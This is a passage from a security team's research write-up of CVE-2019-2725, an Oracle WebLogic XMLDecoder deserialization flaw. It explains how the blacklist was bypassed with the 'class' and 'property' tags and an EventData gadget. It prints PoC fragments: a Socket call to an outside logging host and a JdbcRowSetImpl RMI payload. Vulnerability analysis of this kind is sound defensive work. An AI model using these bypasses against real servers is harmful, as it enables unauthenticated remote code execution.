                                            throw new IllegalStateException("Exceed array length limitation");
                                        }
                                        this.overallarraylength += var7;
                                        if (this.overallarraylength >= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) {
                                            throw new IllegalStateException("Exceed over all array limitation.");
                                        }
                                    } catch (NumberFormatException var8) {
                                        ;
                                    }
It can be seen that the tags of `object`, `new`, and `method` are all
filtered. The `void` tag can only be followed by `index`, and the `array` tag
can be followed by the `class` attribute, but the type can only be of type
`byte`. Among them, the filtering `object` tag is a patch of CVE-2017-3506,
and the remaining filtering is a patch for CVE-2017-10271.
The key to bypassing this blacklist is the `class tag`, which can be found in
the official
[documentation](https://docs.oracle.com/javase/tutorial/javabeans/advanced/longpersistence.html).
The `class` tag can represent an instance of a class, which means that you can
use the class tag to create an instance of any class. The `class` tag is not
in the blacklist of WebLogic, which is the reason for this vulnerability. On
April 26, Oracle released a patch for this vulnerability, and filtering the
`class` tag also confirmed this.
Since the reason for the vulnerability is to bypass the blacklist of
CVE-2017-10271, then `wls-wsat.war` should also be affected.
Test it.
### 21 April
On April 21, 2019, I was going to construct a detection PoC for this
vulnerability. I could use the `class` tag to create an instance of the
`java.net.Socket` class. My jdk version is jdk 6u45.
            java.net.Socket
                aaaaabbbbbbbbbbb.wfanwb.ceye.io
                80
[Ceye](http://ceye.io/) successfully received the request, which also
indicates that the Socket instance was created successfully.
I tested the above PoC on jdk 7, but it failed. The program prompted
java.net.Socket nof found error, which made me think that this vulnerability
could only be triggered under jdk 6. After careful comparison, it was found to
be a newline character problem. The correct PoC should be like this
    java.net.Socketaaaaabbbbbbbbbbb.wfanwb.ceye.io80
### 22 April
On April 22, 2019, @pyn3rd failed to test WebLogic 12.1.3. He found that the
version 12 did not have the
`oracle.toplink.internal.sessions.UnitOfWorkChangeSet` class, so there was no
way to use it. So I tried to construct a new exp. The current situation is
that I can create an instance of the class, but I can't call the method. I
think of `com.sun.rowset.JdbcRowSetImpl` class.
            rmi://localhost:1099/Exploit
            true
This is one of the CVE-2017-10271 payloads. The previous blacklist mentioned
that the `void` tag can only be followed by index, so the above payload will
definitely be rejected by the blacklist. Try to rewrite the above payload
using the `class` tag.
In the process, I found that jdk 6 and jdk 7 handle tags differently.
Jdk 6 uses`com.sun.beans.ObjectHandler`
![
](https://images.seebug.org/content/images/2019/05/43f5d754-fd8c-4de7-b692-defe57ef3161.png-w331s)
Available tags are `string`, `class`, `null`, `void`, `array`, `java`,
`object` and some primive tags (like `int`).
Jdk7 uses`com.sun.beans.decoder.DocumentHandler`
![
](https://images.seebug.org/content/images/2019/05/fe3f5815-840e-42ab-a862-16ea6b64c83f.png-w331s)
As you can see, there are some differences compared with jdk6. For example,
jdk 6 does not support tags such as `new` and `property` .
When I used the jdk 6 tag to construct exp, I did not succeed until I saw the
`property` tag in the source code of jdk 7, I found what I wanted, and this
tag is not in the WebLogic blacklist. So you can override the previous payload
with the `property` tag.
Successfully executed the command and both 10.3.6 and 12.1.3 can be used.
Unfortunately, this payload cannot be used in jdk 6 because jdk 6 does not
support the `property` tag.
### 23 April
On April 23, 2019, After major security companies issued a vulnerability
alert, many fake PoCs that could not bypass the patch appeared. Many people
said that the test was successful, but they were all tested without patches.
Oracle's downloaded WebLogic is not patched, Oracle's patch is a separate
charge, if you install the CVE-2017-10271's patch,these PoC and exp cannot
bypass the blacklist.
### 26 April
On April 26, 2019, Oracle officially released an emergency patch and this
vulnerability has been identified as **CVE-2019-2725**.
### 27 April
On April 27, 2019, @pyn3rd said that the exp of the WebLogic 12.1.3 was also
researched, using `org.slf4j.ext.EventData`
        public EventData(String xml) {
            ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes());
            try {
                XMLDecoder decoder = new XMLDecoder(bais);
                this.eventData = (Map)decoder.readObject();
            } catch (Exception var4) {
                throw new EventException("Error decoding " + xml, var4);
            }
        }
Looking at the construction method of this class, if I can construct an
instance of this class, I can call `XMLDecoder.readObject` again, and the
second time I call this, will not be checked by the blacklist.
### 30 April
On April 30, 2019, I saw other uses of this vulnerability without the version
restrictions of weblogic and jdk. This exploitation I have seen before, is the
[demo video](https://www.youtube.com/watch?v=lePLlC1hFrU&feature=youtu.be)
sent by Tenable. I didn't understand it at the time. After I saw the exploit
method, I realized what I ignored. This exploitation can refer to
CVE-2017-17485 vulnerability.
### summary
For this vulnerability, Oracle issued [a rare out-of-band security
update](https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html) to address this vulnerability, and still uses the
blacklist to fix it. In the process of researching this vulnerability, I also
learned a lot of new tips.
### Reference
  * [关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告](http://www.cnvd.org.cn/webinfo/show/4989)
  * [Weblogic XMLDecoder RCE分析](https://paper.seebug.org/487/)
  * [Oracle Security Alert Advisory - CVE-2019-2725](https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html)
  * [[KnownSec 404 Team] Oracle WebLogic Deserialization RCE Vulnerability (0day) Alert](https://medium.com/@knownseczoomeye/knownsec-404-team-oracle-weblogic-deserialization-rce-vulnerability-0day-alert-90dd9a79ae93)
  * [WebLogic Unauthenticated Remote Code Execution Vulnerability (CVE-2019-2725) with Pocsuite3](https://www.youtube.com/watch?v=NtjC7cheNd8&feature=youtu.be)
## About Knownsec & 404 Team
Beijing Knownsec Information Technology Co., Ltd. was established by a group
of high-profile international security experts. It has over a hundred frontier
security talents nationwide as the core security research team to provide
long-term internationally advanced network security solutions for the
government and enterprises.
Knownsec's specialties include network attack and defense integrated
technologies and product R&D under new situations. It provides visualization
solutions that meet the world-class security technology standards and enhances
the security monitoring, alarm and defense abilities of customer networks with
its industry-leading capabilities in cloud computing and big data processing.
The company's technical strength is strongly recognized by the State Ministry
of Public Security, the Central Government Procurement Center, the Ministry of
Industry and Information Technology (MIIT), China National Vulnerability
Database of Information Security (CNNVD), the Central Bank, the Hong Kong
Jockey Club, Microsoft, Zhejiang Satellite TV and other well-known clients.
404 Team, the core security team of Knownsec, is dedicated to the research of
security vulnerability and offensive and defensive technology in the fields of
Web, IoT, industrial control, blockchain, etc. 404 team has submitted
vulnerability research to many well-known vendors such as Microsoft, Apple,
Adobe, Tencent, Alibaba, Baidu, etc. And has received a high reputation in the
industry.
The most well-known sharing of Knownsec 404 Team includes: [KCon Hacking
Conference](http://kcon.knownsec.com/ "KCon Hacking Conference"), [Seebug
Vulnerability Database](https://www.seebug.org/ "Seebug Vulnerability
Database") and [ZoomEye Cyberspace Search Engine](https://www.zoomeye.org/
"ZoomEye Cyberspace Search Engine").
* * *